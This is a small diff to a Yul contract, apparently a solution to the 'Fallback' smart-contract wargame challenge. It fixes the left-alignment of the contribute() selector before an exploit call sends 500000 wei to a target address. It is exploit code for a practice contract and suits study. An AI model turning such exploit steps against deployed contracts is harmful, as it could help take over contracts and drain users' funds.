@@ -31,8 +31,8 @@ object "Fallback" {
           // Get target address from calldata (first parameter after selector)
           let target := calldataload(0x04)
           
-          // Prepare calldata for contribute()
-          mstore(0x00, 0xd7bb99ba)
+          // Prepare calldata for contribute() - selector needs to be left-aligned
+          mstore(0x00, shl(224, 0xd7bb99ba))
           
           // 1. call fallback.contribute() to send 0.0005 ether (500000 wei)
           let res1 := call(gas(), target, 500000, 0x00, 0x04, 0x00, 0x00)
